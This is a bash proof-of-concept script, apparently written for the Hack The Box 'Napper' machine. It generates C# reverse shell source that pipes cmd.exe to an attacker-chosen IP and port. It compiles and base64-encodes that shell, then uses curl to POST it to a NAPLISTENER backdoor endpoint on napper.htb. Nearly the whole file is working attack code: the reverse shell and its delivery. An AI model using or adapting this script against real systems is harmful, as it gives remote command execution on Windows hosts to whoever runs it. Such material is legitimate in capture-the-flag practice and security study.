#!/bin/bash

# Help panel
help_panel(){
    echo -e "\n| Napper NAPLISTENER PoC |"
    echo
    echo -e "[*] Usage: $0 -i <ip> -p <port>"
}

filename="Program.cs";

# Create C# reverse shell
if [[ ! -f "$(pwd)/$filename" ]]; then
cat << EOF > $filename
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
namespace Program
{
	public class Run
	{
		static StreamWriter streamWriter;
		public Run()
		{
			RunMain();
		}
		public void RunMain()
		{
			using(TcpClient client = new TcpClient("IP", PORT))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();
						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();
						while(true)
						{
							strInput.Append(rdr.ReadLine());
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}
		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }
	}
	public class AnotherClass
    {
        public static void Main(string[] args)
        {
            Run runInstance = new Run();
        }
    }
}
EOF
fi

init_naplistener(){
    # Insert IP and PORT
    sed -i "s/IP/$ip/g;s/PORT/$port/g" $filename

    # Compile and encode C# file
    PAYLOAD=$(mcs $filename &>/dev/null && base64 -w0 "$(basename $filename .cs).exe")

    # Send POST request
    curl -ski -XPOST https://napper.htb/ews/MsExgHealthCheckd/ --data-urlencode "sdafwe3rwe23=$PAYLOAD"
}

# Main
if [ "$#" -eq 0 ]; then
    help_panel; exit 1
fi

while getopts ":hi:p:" opt
do
    case $opt in
        h)
            help_panel;
            exit;;
        i)
            ip=$OPTARG;;
        p)
            port=$OPTARG;;
        \?)
            echo -e "\n[x] Error: Invalid option"; exit 1;;
    esac
done

init_naplistener